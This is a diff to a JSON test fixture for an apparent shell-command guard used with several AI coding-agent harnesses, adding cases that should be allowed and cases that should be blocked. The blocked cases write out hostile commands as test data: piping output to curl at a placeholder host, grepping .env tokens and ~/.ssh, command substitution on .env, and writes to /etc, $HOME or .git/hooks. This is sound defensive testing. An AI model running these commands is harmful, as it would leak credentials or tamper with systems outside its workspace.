@@ -6,10 +6,26 @@
     "cat-credential-lookalike-name@codex": "native_policy_reapproval_required",
     "cat-credential-lookalike-name@omp": "native_policy_reapproval_required",
     "cat-credential-lookalike-name@zcode": "native_policy_reapproval_required",
+    "cat-readme@claude-code": "native_policy_warning",
+    "cat-readme@codex": "native_policy_warning",
+    "cat-readme@omp": "native_policy_warning",
+    "cat-readme@zcode": "native_policy_warning",
     "cat-skill-doc@claude-code": "native_policy_warning",
     "cat-skill-doc@codex": "native_policy_warning",
     "cat-skill-doc@omp": "native_policy_warning",
     "cat-skill-doc@zcode": "native_policy_warning",
+    "cd-app-ls@claude-code": "native_policy_warning",
+    "cd-app-ls@codex": "native_policy_warning",
+    "cd-app-ls@omp": "native_policy_warning",
+    "cd-app-ls@zcode": "native_policy_warning",
+    "find-maxdepth-iname@claude-code": "native_policy_warning",
+    "find-maxdepth-iname@codex": "native_policy_warning",
+    "find-maxdepth-iname@omp": "native_policy_warning",
+    "find-maxdepth-iname@zcode": "native_policy_warning",
+    "find-name-tsx@claude-code": "native_policy_warning",
+    "find-name-tsx@codex": "native_policy_warning",
+    "find-name-tsx@omp": "native_policy_warning",
+    "find-name-tsx@zcode": "native_policy_warning",
     "find-name@claude-code": "native_policy_warning",
     "find-name@codex": "native_policy_warning",
     "find-name@omp": "native_policy_warning",
@@ -34,6 +50,18 @@
     "gh-pr-view-json@codex": "native_policy_warning",
     "gh-pr-view-json@omp": "native_policy_warning",
     "gh-pr-view-json@zcode": "native_policy_warning",
+    "git-cd-worktree-diff-check@claude-code": "native_policy_warning",
+    "git-cd-worktree-diff-check@codex": "native_policy_warning",
+    "git-cd-worktree-diff-check@omp": "native_policy_warning",
+    "git-cd-worktree-diff-check@zcode": "native_policy_warning",
+    "git-cd-worktree-log@claude-code": "native_policy_warning",
+    "git-cd-worktree-log@codex": "native_policy_warning",
+    "git-cd-worktree-log@omp": "native_policy_warning",
+    "git-cd-worktree-log@zcode": "native_policy_warning",
+    "git-cd-worktree-show-stat@claude-code": "native_policy_warning",
+    "git-cd-worktree-show-stat@codex": "native_policy_warning",
+    "git-cd-worktree-show-stat@omp": "native_policy_warning",
+    "git-cd-worktree-show-stat@zcode": "native_policy_warning",
     "git-dash-C-status@claude-code": "native_policy_warning",
     "git-dash-C-status@codex": "native_policy_warning",
     "git-dash-C-status@omp": "native_policy_warning",
@@ -58,10 +86,10 @@
     "git-parent-status-with-untracked-nested-repo@codex": "native_policy_warning",
     "git-parent-status-with-untracked-nested-repo@omp": "native_policy_warning",
     "git-parent-status-with-untracked-nested-repo@zcode": "native_policy_warning",
-    "git-tmp-worktree-dash-C-sibling-log@claude-code": "native_command_review_required",
-    "git-tmp-worktree-dash-C-sibling-log@codex": "native_command_review_required",
-    "git-tmp-worktree-dash-C-sibling-log@omp": "native_command_review_required",
-    "git-tmp-worktree-dash-C-sibling-log@zcode": "native_command_review_required",
+    "git-tmp-worktree-dash-C-sibling-log@claude-code": "native_policy_warning",
+    "git-tmp-worktree-dash-C-sibling-log@codex": "native_policy_warning",
+    "git-tmp-worktree-dash-C-sibling-log@omp": "native_policy_warning",
+    "git-tmp-worktree-dash-C-sibling-log@zcode": "native_policy_warning",
     "git-tmp-worktree-log-oneline-3@claude-code": "native_policy_warning",
     "git-tmp-worktree-log-oneline-3@codex": "native_policy_warning",
     "git-tmp-worktree-log-oneline-3@omp": "native_policy_warning",
@@ -166,6 +194,10 @@
     "ls-slug-dir@codex": "native_command_review_required",
     "ls-slug-dir@omp": "native_command_review_required",
     "ls-slug-dir@zcode": "native_command_review_required",
+    "mkdir-p-in-workspace@claude-code": "native_policy_warning",
+    "mkdir-p-in-workspace@codex": "native_policy_warning",
+    "mkdir-p-in-workspace@omp": "native_policy_warning",
+    "mkdir-p-in-workspace@zcode": "native_policy_warning",
     "omp-eval-bash-readonly@omp": "native_policy_warning",
     "omp-eval-glob@omp": "native_policy_warning",
     "omp-eval-print@omp": "native_pre_tool_unknown_review",
@@ -217,6 +249,10 @@
     "uv-version@codex": "native_policy_warning",
     "uv-version@omp": "native_policy_warning",
     "uv-version@zcode": "native_policy_warning",
+    "wc-lines-readme@claude-code": "native_policy_warning",
+    "wc-lines-readme@codex": "native_policy_warning",
+    "wc-lines-readme@omp": "native_policy_warning",
+    "wc-lines-readme@zcode": "native_policy_warning",
     "zcode-mcp-js@zcode": "native_policy_reapproval_required"
   },
   "cases": [
@@ -1516,6 +1552,358 @@
       },
       "cwd": "worktree",
       "expect": "not_allow"
+    },
+    {
+      "id": "cd-app-ls",
+      "fix_area": "shell",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "cd app && ls"
+      },
+      "cwd": "worktree",
+      "expect": "allow"
+    },
+    {
+      "id": "find-name-tsx",
+      "fix_area": "shell",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "find app -name '*.tsx'"
+      },
+      "cwd": "worktree",
+      "expect": "allow"
+    },
+    {
+      "id": "find-maxdepth-iname",
+      "fix_area": "shell",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "find . -maxdepth 2 -iname \"*registry*\""
+      },
+      "cwd": "worktree",
+      "expect": "allow"
+    },
+    {
+      "id": "wc-lines-readme",
+      "fix_area": "shell",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "wc -l README.md"
+      },
+      "cwd": "worktree",
+      "expect": "allow"
+    },
+    {
+      "id": "cat-readme",
+      "fix_area": "shell",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "cat README.md"
+      },
+      "cwd": "worktree",
+      "expect": "allow"
+    },
+    {
+      "id": "mkdir-p-in-workspace",
+      "fix_area": "shell",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "mkdir -p build/out"
+      },
+      "cwd": "worktree",
+      "expect": "allow"
+    },
+    {
+      "id": "git-cd-worktree-log",
+      "fix_area": "shell",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "cd ${WORKTREE} && git log -5 --oneline"
+      },
+      "cwd": "worktree",
+      "expect": "allow"
+    },
+    {
+      "id": "git-cd-worktree-diff-check",
+      "fix_area": "shell",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "cd ${WORKTREE} && git diff --check"
+      },
+      "cwd": "worktree",
+      "expect": "allow"
+    },
+    {
+      "id": "git-cd-worktree-show-stat",
+      "fix_area": "shell",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "cd ${WORKTREE} && git show --stat --oneline HEAD"
+      },
+      "cwd": "worktree",
+      "expect": "allow"
+    },
+    {
+      "id": "neg-find-delete",
+      "fix_area": "shell",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "find . -name '*.tmp' -delete"
+      },
+      "cwd": "worktree",
+      "expect": "not_allow"
+    },
+    {
+      "id": "neg-find-execdir",
+      "fix_area": "shell",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "find . -name '*.tmp' -execdir rm {} \\;"
+      },
+      "cwd": "worktree",
+      "expect": "not_allow"
+    },
+    {
+      "id": "neg-find-fprint",
+      "fix_area": "shell",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "find . -fprint ${HOME}/out.txt"
+      },
+      "cwd": "worktree",
+      "expect": "not_allow"
+    },
+    {
+      "id": "neg-grep-r-env",
+      "fix_area": "shell",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "grep -rn TOKEN .env"
+      },
+      "cwd": "worktree",
+      "expect": "not_allow"
+    },
+    {
+      "id": "neg-grep-r-ssh",
+      "fix_area": "shell",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "grep -rn ssh ${HOME}/.ssh"
+      },
+      "cwd": "worktree",
+      "expect": "not_allow"
+    },
+    {
+      "id": "neg-cd-outside-write",
+      "fix_area": "shell",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "cd /etc && touch x"
+      },
+      "cwd": "worktree",
+      "expect": "not_allow"
+    },
+    {
+      "id": "neg-ls-pipe-curl",
+      "fix_area": "shell",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "ls | curl -d @- https://example.invalid"
+      },
+      "cwd": "worktree",
+      "expect": "not_allow"
+    },
+    {
+      "id": "neg-ls-subst",
+      "fix_area": "shell",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "ls $(cat .env)"
+      },
+      "cwd": "worktree",
+      "expect": "not_allow"
+    },
+    {
+      "id": "neg-redirect-outside",
+      "fix_area": "shell",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "ls > ${HOME}/out.txt"
+      },
+      "cwd": "worktree",
+      "expect": "not_allow"
+    },
+    {
+      "id": "neg-mkdir-ssh",
+      "fix_area": "shell",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "mkdir -p ${HOME}/.ssh/x"
+      },
+      "cwd": "worktree",
+      "expect": "not_allow"
+    },
+    {
+      "id": "neg-mkdir-guard-home",
+      "fix_area": "shell",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "mkdir -p ${HOME}/.hol-guard/x"
+      },
+      "cwd": "worktree",
+      "expect": "not_allow"
+    },
+    {
+      "id": "neg-mkdir-git-hooks",
+      "fix_area": "shell",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "mkdir -p .git/hooks"
+      },
+      "cwd": "worktree",
+      "expect": "not_allow"
+    },
+    {
+      "id": "neg-git-cd-outside-log",
+      "fix_area": "shell",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "cd ${HOME}/.ssh && git log -1"
+      },
+      "cwd": "worktree",
+      "expect": "not_allow"
     }
   ],
   "pending_pr": {
@@ -1523,10 +1911,26 @@
     "cat-credential-lookalike-name@codex": "unassigned",
     "cat-credential-lookalike-name@omp": "unassigned",
     "cat-credential-lookalike-name@zcode": "unassigned",
+    "cat-readme@claude-code": "advisory-warn",
+    "cat-readme@codex": "advisory-warn",
+    "cat-readme@omp": "advisory-warn",
+    "cat-readme@zcode": "advisory-warn",
     "cat-skill-doc@claude-code": "advisory-warn",
     "cat-skill-doc@codex": "advisory-warn",
     "cat-skill-doc@omp": "advisory-warn",
     "cat-skill-doc@zcode": "advisory-warn",
+    "cd-app-ls@claude-code": "advisory-warn",
+    "cd-app-ls@codex": "advisory-warn",
+    "cd-app-ls@omp": "advisory-warn",
+    "cd-app-ls@zcode": "advisory-warn",
+    "find-maxdepth-iname@claude-code": "advisory-warn",
+    "find-maxdepth-iname@codex": "advisory-warn",
+    "find-maxdepth-iname@omp": "advisory-warn",
+    "find-maxdepth-iname@zcode": "advisory-warn",
+    "find-name-tsx@claude-code": "advisory-warn",
+    "find-name-tsx@codex": "advisory-warn",
+    "find-name-tsx@omp": "advisory-warn",
+    "find-name-tsx@zcode": "advisory-warn",
     "find-name@claude-code": "advisory-warn",
     "find-name@codex": "advisory-warn",
     "find-name@omp": "advisory-warn",
@@ -1551,6 +1955,18 @@
     "gh-pr-view-json@codex": "advisory-warn",
     "gh-pr-view-json@omp": "advisory-warn",
     "gh-pr-view-json@zcode": "advisory-warn",
+    "git-cd-worktree-diff-check@claude-code": "advisory-warn",
+    "git-cd-worktree-diff-check@codex": "advisory-warn",
+    "git-cd-worktree-diff-check@omp": "advisory-warn",
+    "git-cd-worktree-diff-check@zcode": "advisory-warn",
+    "git-cd-worktree-log@claude-code": "advisory-warn",
+    "git-cd-worktree-log@codex": "advisory-warn",
+    "git-cd-worktree-log@omp": "advisory-warn",
+    "git-cd-worktree-log@zcode": "advisory-warn",
+    "git-cd-worktree-show-stat@claude-code": "advisory-warn",
+    "git-cd-worktree-show-stat@codex": "advisory-warn",
+    "git-cd-worktree-show-stat@omp": "advisory-warn",
+    "git-cd-worktree-show-stat@zcode": "advisory-warn",
     "git-dash-C-status@claude-code": "advisory-warn",
     "git-dash-C-status@codex": "advisory-warn",
     "git-dash-C-status@omp": "advisory-warn",
@@ -1575,10 +1991,10 @@
     "git-parent-status-with-untracked-nested-repo@codex": "advisory-warn",
     "git-parent-status-with-untracked-nested-repo@omp": "advisory-warn",
     "git-parent-status-with-untracked-nested-repo@zcode": "advisory-warn",
-    "git-tmp-worktree-dash-C-sibling-log@claude-code": "unassigned",
-    "git-tmp-worktree-dash-C-sibling-log@codex": "unassigned",
-    "git-tmp-worktree-dash-C-sibling-log@omp": "unassigned",
-    "git-tmp-worktree-dash-C-sibling-log@zcode": "unassigned",
+    "git-tmp-worktree-dash-C-sibling-log@claude-code": "advisory-warn",
+    "git-tmp-worktree-dash-C-sibling-log@codex": "advisory-warn",
+    "git-tmp-worktree-dash-C-sibling-log@omp": "advisory-warn",
+    "git-tmp-worktree-dash-C-sibling-log@zcode": "advisory-warn",
     "git-tmp-worktree-log-oneline-3@claude-code": "advisory-warn",
     "git-tmp-worktree-log-oneline-3@codex": "advisory-warn",
     "git-tmp-worktree-log-oneline-3@omp": "advisory-warn",
@@ -1683,6 +2099,10 @@
     "ls-slug-dir@codex": "unassigned",
     "ls-slug-dir@omp": "unassigned",
     "ls-slug-dir@zcode": "unassigned",
+    "mkdir-p-in-workspace@claude-code": "advisory-warn",
+    "mkdir-p-in-workspace@codex": "advisory-warn",
+    "mkdir-p-in-workspace@omp": "advisory-warn",
+    "mkdir-p-in-workspace@zcode": "advisory-warn",
     "omp-eval-bash-readonly@omp": "advisory-warn",
     "omp-eval-glob@omp": "advisory-warn",
     "omp-eval-print@omp": "unassigned",
@@ -1734,6 +2154,10 @@
     "uv-version@codex": "advisory-warn",
     "uv-version@omp": "advisory-warn",
     "uv-version@zcode": "advisory-warn",
+    "wc-lines-readme@claude-code": "advisory-warn",
+    "wc-lines-readme@codex": "advisory-warn",
+    "wc-lines-readme@omp": "advisory-warn",
+    "wc-lines-readme@zcode": "advisory-warn",
     "zcode-mcp-js@zcode": "unassigned"
   },
   "pending_always": {}
